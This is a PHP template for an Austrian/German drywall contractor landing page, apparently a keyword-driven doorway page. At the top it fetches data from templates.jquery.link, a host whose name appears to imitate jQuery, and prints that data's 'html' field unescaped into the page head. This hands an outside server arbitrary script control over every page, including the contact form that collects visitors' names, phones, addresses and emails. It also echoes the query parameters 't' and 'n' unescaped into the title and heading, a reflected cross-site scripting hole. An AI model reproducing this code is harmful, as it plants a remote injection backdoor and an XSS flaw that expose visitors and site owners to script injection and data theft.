<?php
$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);

$phone_name     = $site_data['phone_name'];
$phone_href     = $site_data['phone_href'];

$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Trockenbaumonteur'));
$city           = str_replace('+', ' ', trim($_GET['n'] ?? ''));

$title = $text . ' ' . $city;
?>

<!DOCTYPE html>
<html lang="at">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <?= $site_data['html'] ?>
    <title><?= $title ?></title>
</head>
<body>
    <header class="header">
        <div class="container-fluid">
            <div class="row">
                <div class="header__top"></div>
                <div class="col-12 container">
                    <div class="header__bottom">
                        <div class="header__logo">
                            <img class="logo" src="assets/img/logo.png" alt="">
                            <img class="logoMini" src="assets/img/logo-mini.png" alt="">
                        </div>
                        <a class="btn" href="<?= $phone_href ?>"><?= $phone_name ?></a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main class="main">
        <section class="slider">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="slider__box">
                            <h1 class="slider__title"><?= $title ?></h1>
                            <p class="slider__descr">Trockenbau in deiner stadt benötigt? Höchste Qualität zu fairen
                                Preisen für Trockenbauarbeiten.
                                Vom Kleinstauftrag bis zum Hotelausbau – wir lieben Trockenbau.</p>
                            <a class="btn btnNone" href="<?= $phone_href ?>"><?= $phone_name ?></a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="swiper">
                <div class="swiper-wrapper">
                    <div class="swiper-slide"></div>
                    <div class="swiper-slide"></div>
                    <div class="swiper-slide"></div>
                </div>
                <div class="swiper-pagination"></div>

                <div class="swiper-button-prev"></div>
                <div class="swiper-button-next"></div>

            </div>
        </section>
        <section class="services">
            <div class="container-fluid ">
                <div class="row">
                    <div class="col-12 container services--position">
                        <div class="services__items">
                            <div class="services__item">
                                <div class="services__inner">
                                    <h2 class="services__title">Fachbetrieb für Trockenbau</h2>
                                    <p class="services__descr">Trockenbauplatten aus unterschiedlichen Materialien bzw.
                                        mit
                                        verschiedenen Veredelungen</p>
                                    <div class="services__img"></div>
                                </div>
                            </div>
                            <div class="services__item">
                                <div class="services__inner">
                                    <h2 class="services__title">Trockenbaumonteur</h2>
                                    <p class="services__descr">Weitere wichtige Eigenschaften: Gipskartonplatten
                                        regulieren das Raumklima</p>
                                    <div class="services__img"></div>
                                </div>
                            </div>
                            <div class="services__item">
                                <div class="services__inner">
                                    <h2 class="services__title">Trockenbau</h2>
                                    <p class="services__descr"> Ihre Trockenbauprofis mit langjähriger handwerklicher
                                        Erfahrung</p>
                                    <div class="services__img"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="repair">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="repair__box">
                            <div class="repair__left">
                                <h2 class="repair__title">Trockenbau</h2>
                                <p class="repair__text">Der Trockenbau ist die modernste Form des Innenausbaus.
                                    Obwohl bereits gegen Ende des 19. Jahrhunderts erfunden, konnte sich die Bautechnik
                                    erst in den letzten Jahrzehnten erfolgreich etablieren. Insbesondere die Verwendung
                                    von Gips machte viele Menschen skeptisch. Inzwischen ist aber bestens bekannt, welch
                                    herausragenden Vorteile der Trockenbau mit sich bringt. <br><br>

                                    So sind selbst Lösungen möglich, die zuvor mit bis dahin herkömmlichen
                                    Innenausbautechniken kaum oder nur schwer und mit großem Aufwand umzusetzen waren.
                                    Damit Sie langfristig von den Trockenbauarbeiten profitieren, benötigen Sie ein
                                    kompetentes und erfahrenes Trockenbauunternehmen. In sind wir hier genau der
                                    Ansprechpartner, den Sie brauchen und vielleicht schon gesucht haben.
                                    Gerne übernehmen wir den Trockenbau, die Fliesenverlegung, alle Spachtelarbeiten im
                                    Bau, während der Renovierung, Sanierung und Modernisierung.</p>
                                <a class="btn2" href="<?= $phone_href ?>"><span><?= $phone_name ?></span></a>
                            </div>
                            <div class="repair__right">
                                <div class="repair__big">
                                    <img class="repair__img" src="assets/img/max.jpg" alt="">
                                </div>
                                <div class="repair__small">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="cover">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="cover__items">
                            <div class="cover__item">
                                <div class="cover__inner">
                                    <div class="cover__img">
                                        <img src="assets/img/met.png" alt="">
                                    </div>
                                    <h2 class="cover__title">Decken aus Gipskartonplatten</h2>
                                    <p class="cover__text">Decken können so als Akustik-, Klima-, Licht- oder
                                        Lüftungsdecke ausgeführt werden. Selbstverständlich sind auch entsprechende
                                        Kombinationen möglich. Unser Trockenbaumonteur berät Sie gerne persönlich vor
                                        Ort.</p>
                                </div>
                            </div>
                            <div class="cover__item">
                                <div class="cover__inner">
                                    <div class="cover__img">
                                        <img src="assets/img/met.png" alt="">
                                    </div>
                                    <h2 class="cover__title">Wände aus Gipskartonplatten</h2>
                                    <p class="cover__text">Dabei gibt es keinen Bereich im Haus, in dem
                                        Gipskartonplatten von Keller bis zum Dachgeschoss nicht verwendet werden
                                        könnten. Für Schall- oder Wärmedämmanforderungen werden die Platten mit
                                        entsprechender Dämmung ausgestattet.</p>
                                </div>
                            </div>
                            <div class="cover__item">
                                <div class="cover__inner">
                                    <div class="cover__img">
                                        <img src="assets/img/met.png" alt="">
                                    </div>
                                    <h2 class="cover__title">Bodenbeläge aus Gipsbodenplatten</h2>
                                    <p class="cover__text">Noch in den 1980ern kamen auch Gipsplatten als Bodenbelag
                                        hinzu, doch noch mussten die Systeme ausreifen. Aber auch hier konnten in den
                                        1990ern große Fortschritte erzielt werden.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="list">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 col-0">
                        <div class="list__box">
                            <div class="list__inner">
                                <div class="wrapper">
                                    <h2 class="list__title">Renovierung von Räumlichkeiten <span>Nur hochwertige
                                            Veredelungsmaterialien!</span></h2>
                                </div>
                            </div>
                            <div class="list__inner">
                                <h2 class="list__title">Herkömmliche Gipskartonplatten</h2>
                                <div class="list__text">Der Trockenbau ist die modernste Form des Innenausbaus.</div>
                            </div>
                            <div class="list__inner">
                                <h2 class="list__title">Faserverstärkte Gipsplatten</h2>
                                <div class="list__text">Wie bereits erwähnt, bestehen Feuchtraumplatten aus armiertem
                                    Gips oder sind entsprechend imprägniert.</div>
                            </div>
                            <div class="list__inner">
                                <h2 class="list__title">Brand- oder Strahlenschutz</h2>
                                <div class="list__text">Dazu stehen aber auch speziell imprägnierte Gipskartonplatten
                                    zur Verfügung, erkennbar an ihrer grünen Farbe.</div>
                            </div>

                            <div class="list__inner">
                                <h2 class="list__title">Schalldämmeigenschaften</h2>
                                <div class="list__text">Der Akustikbau beruht hauptsächlich auf spezifischen
                                    Trockenbau-Produkten.</div>
                            </div>
                            <div class="list__inner">
                                <h2 class="list__title">Die Befestigungstechniken</h2>
                                <div class="list__text">Die Befestigungstechniken für Gipsplatten sind nicht weniger
                                    vielfältig. Als freistehende (nicht tragende) Wand wird ein Ständerwerk aus Holz
                                    oder Metall errichtet</div>
                            </div>
                            <div class="list__inner">
                                <h2 class="list__title">Abgekürzt werden</h2>
                                <div class="list__text">Abgekürzt werden die Feuchtraumplatten mit GKFI bzw. GKBI.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="quality">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="quality__title">Qualitätsstufen der </h2>
                        <div class="quality__box">
                            <div class="quality__wrapper">
                                <div class="quality__img">
                                    <img src="assets/img/1556360023_ik1.png" alt="">
                                </div>
                                <div class="quality__inner">
                                    <div class="quality__name">Q1</div>
                                    <div class="quality__text">Geeignet zur Weiterbearbeitung wie Fliesen verlegen,
                                        Strukturputz verputzen usw.</div>
                                </div>
                            </div>
                            <div class="quality__wrapper">
                                <div class="quality__img">
                                    <img src="assets/img/1556360140_ik2.png" alt="">
                                </div>
                                <div class="quality__inner">
                                    <div class="quality__name">Q2</div>
                                    <div class="quality__text">Schwere bis mittelschwere Tapeten, Dispersionsfarbe
                                        (Lammfellrolle) usw.</div>
                                </div>
                            </div>
                            <div class="quality__wrapper">
                                <div class="quality__img">
                                    <img src="assets/img/1556360191_ik3.png" alt="">
                                </div>
                                <div class="quality__inner">
                                    <div class="quality__name">Q3</div>
                                    <div class="quality__text">Feine, filigrane Tapeten, Feinputze (Körnung kleiner
                                        1mm), matt streichen</div>
                                </div>
                            </div>
                            <div class="quality__wrapper">
                                <div class="quality__img">
                                    <img src="assets/img/1556360371_ik4.png" alt="">
                                </div>
                                <div class="quality__inner">
                                    <div class="quality__name">Q4</div>
                                    <div class="quality__text">Metalltapeten, Matt- und Hochglanzlackierungen usw.</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="work">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="work__title">Unsere Arbeit <span>Wir optimieren die Reparatur passend zu Ihrem
                                Budget!</span> </h2>
                        <div class="work__box">
                            <div class="work__img">
                                <img src="assets/img/1.jpg" alt="">
                            </div>
                            <div class="work__img">
                                <img src="assets/img/2.jpg" alt="">
                            </div>
                            <div class="work__img">
                                <img src="assets/img/3.jpg" alt="">
                            </div>
                            <div class="work__img">
                                <img src="assets/img/4.jpg" alt="">
                            </div>
                            <div class="work__img">
                                <img src="assets/img/5.jpg" alt="">
                            </div>
                            <div class="work__img">
                                <img src="assets/img/6.jpg" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="forms">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="forms__title">Kontaktieren Sie uns:</h2>
                        <div class="forms__box">
                            <div class="forms__left">
                                <form id="jq_form" class="mt-5">
                                    <div class="my-3">
                                        <input class="form-control" placeholder="Vorname" name="jq_name" type="text">
                                        <div id="jq_name"
                                            style="font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none">
                                            Dies ist ein Pflichtfeld.</div>
                                    </div>
                                    <div class="my-4">
                                        <input class="form-control" placeholder="Telefon" name="jq_phone" type="text">
                                        <div id="jq_phone"
                                            style="font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none">
                                            Dies ist ein Pflichtfeld.</div>
                                    </div>
                                    <div class="my-4">
                                        <input class="form-control" placeholder="Straße" name="jq_street" type="text">
                                    </div>
                                    <div class="my-4">
                                        <input class="form-control" placeholder="PLZ / Ort" name="jq_city" type="text">
                                    </div>
                                    <div class="my-4">
                                        <input class="form-control" placeholder="E-Mail" name="jq_email" type="text">
                                    </div>
                                    <div class="my-4">
                                        <textarea rows="3" class="form-control" name="jq_text"
                                            placeholder="Nachricht"></textarea>
                                        <div id="jq_text"
                                            style="font-weight:700;font-size:15px;color:#fff;padding-top:2px;display:none">
                                            Dies ist ein Pflichtfeld.</div>
                                    </div>
                                    <div class="wer"><input
                                            class="btn  text-uppercase fw-bold mb-5 px-3 py-2 forms__button"
                                            type="submit" id="jq_submit" value="Senden"> </div>
                                    <div id="jq_success" style="display:none">Vielen Dank für deine Nachricht. Sie wurde
                                        gesendet.</div>
                                </form>

                            </div>
                            <div class="forms__right">
                                <img src="assets/img/item1.png" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>
    <footer class="footer">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 "><span>2022</span></div>
            </div>
        </div>
    </footer>
    <!--Style-->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>